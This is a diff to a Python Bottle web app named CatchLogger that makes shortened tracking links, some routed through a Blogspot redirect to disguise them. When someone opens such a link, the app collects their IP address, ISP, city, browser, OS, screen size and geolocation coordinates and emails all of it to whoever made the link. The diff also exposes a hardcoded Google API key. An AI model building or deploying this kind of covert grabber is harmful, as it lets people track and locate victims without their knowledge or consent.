@@ -2,18 +2,26 @@ import os
 import sqlite3
 import smtplib
 import json
+import mail
 import requests
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEText import MIMEText
 from bottle import *
 from socket import gethostname, gethostbyname 
 
+
+#===============RETURN FILES===============
+
 def page_file(root, filename):
     return static_file(filename, root=root)
+
 
 def html(filename):
 	filename += ".html"
 	return static_file(filename, root="./html/")
+
+
+#================SYSTEM FUNCS==============
 
 def shorten(link):
     url = "https://www.googleapis.com/urlshortener/v1/url?key=AIzaSyAKytZN_unLk1FNtcISeYoWIcm2d8jSPXU"
@@ -22,6 +30,7 @@ def shorten(link):
     r = json.loads(r.text)
     r = r["id"]
     return r
+
 
 def send_email(text, addr): 
     fromaddr = "catchlogger.noreply@gmail.com"
@@ -42,10 +51,48 @@ def send_email(text, addr):
     server.quit()
 
 
+#===================BODY====================
+
 @get("/")
 def man():
     return html("index")
 
+
+@get("/spasibi")
+def faq():
+    return html("spasibi")
+
+
+@get("/login")
+def login():
+    return html("login")
+
+#-------------------SYSTEM------------------
+
+# Creating link
+@post("/createlink/<method>")
+def prcss(method):
+    rq = request.forms
+    howto = rq.get("howto")
+    if method == "email":
+        link_addr = rq.get("link_addr")
+        email = rq.get("email")
+        link = "https://catchlogger.herokuapp.com/link?whereto=%s&email=%s&method=%s" % (link_addr, email, method)
+
+        if howto == "SafeR":
+            link = "http://catchlogger.blogspot.com/p/blog-page.html?red=" + link
+
+        return shorten(link)
+
+
+# Getting userInfo by link
+@get("/link")
+def redir():
+    rq = request.query
+    return template("catch.html", whereto=rq['whereto'], method=rq['method'], email=rq['email'])
+
+
+# Getting info, forming and sending email
 @get("/get_info")
 def obr():
     adr = request.query.email
@@ -67,41 +114,13 @@ def obr():
     	d['rad'] = "Okay"
     APIipADDR = "http://ip-api.com/json/"+ip
     ip_dic = json.loads(requests.get(APIipADDR).text)
-    text = """By navigator:
-Browser: %s
-Language: %s
-OS: %s
-
-By BrowserDetect:
-Browser: %s
-OS: %s
-
-Window:
-Height: %s
-Width: %s
-
-Location:
-latitude: %s
-longitude: %s
-Radius: %s
-Location link: http://catchlogger.herokuapp.com/locvar_access?lat=%s&lng=%s&rad=%s
-
-IP = %s
-Provider: %s
-Region, city: %s, %s
-
-PS Android is also Linux (!)
-
-----
-CatchLogger system by Andrey A Tyunyatkin""" % (d['browser'], d['language'], d['OS'], d['navbrser'], d['navos'], d['h'], d['w'], d['lat'], d['long'], d['rad'], d['lat'], d['long'], d['rad'], ip, ip_dic["org"], ip_dic["regionName"], ip_dic["city"])
+    text = mail.text % (d['browser'], d['language'], d['OS'], d['navbrser'], d['navos'], d['h'], d['w'], d['lat'], d['long'], d['rad'], d['lat'], d['long'], d['rad'], ip, ip_dic["org"], ip_dic["regionName"], ip_dic["city"])
     send_email(text, adr)
     print("SENT MAIL TO " + str(adr))
     
 
-@get("/login")
-def login():
-	return html("login")
-
+# RETURNING LOCATION MAP (email link)
+# needs to be improved - USE TEMPLATES, don't read files with js!!!
 @get("/locvar_access")
 def lcvr():
     lat = request.query['lat']
@@ -116,36 +135,7 @@ var get_rad = %s""" % (lat, lng, rad)
     return static_file("circler.html", root='.')
 
 
-@get("/spasibi")
-def faq():
-    return html("spasibi")
 
-# test logger
-@get("/catch")
-def chk():
-    return html("catch")
-#---------------
-
-@get("/link")
-def redir():
-    rq = request.query
-    return template("catch.html", whereto=rq['whereto'], method=rq['method'], email=rq['email'])
-
-@post("/createlink/<method>")
-def prcss(method):
-    rq = request.forms
-    howto = rq.get("howto")
-    if method == "email":
-        link_addr = rq.get("link_addr")
-        email = rq.get("email")
-        link = "https://catchlogger.herokuapp.com/link?whereto=%s&email=%s&method=%s" % (link_addr, email, method)
-
-        if howto == "SafeR":
-            link = "http://catchlogger.blogspot.com/p/blog-page.html?red=" + link
-
-        return shorten(link)
-
-        
 # =========================FOR BEAUTY==========================
 
 @route("/<root>/<filename>")
@@ -172,16 +162,24 @@ def js():
 def br():
     return static_file("browser.js", root='./js/')
 
-#@error(404)
-#def fff(error):
-#    return html("404")
+@error(404)
+def fff(error):
+    return html("404")
 
-#@error(500)
-
-#def fff(error):
-#    return html("500")
+@error(500)
+def fff(error):
+    return html("500")
 # -------------------------------------------------------------
 
+#---------------
+# test logger
+@get("/catch")
+def chk():
+    return html("catch")
+#---------------
+
+# If redirect not working
+# !!!SHOULD STAY IN THE END!!!
 @get("/<somewhere>")
 def red(somewhere):
     somewhere = "http://" + somewhere
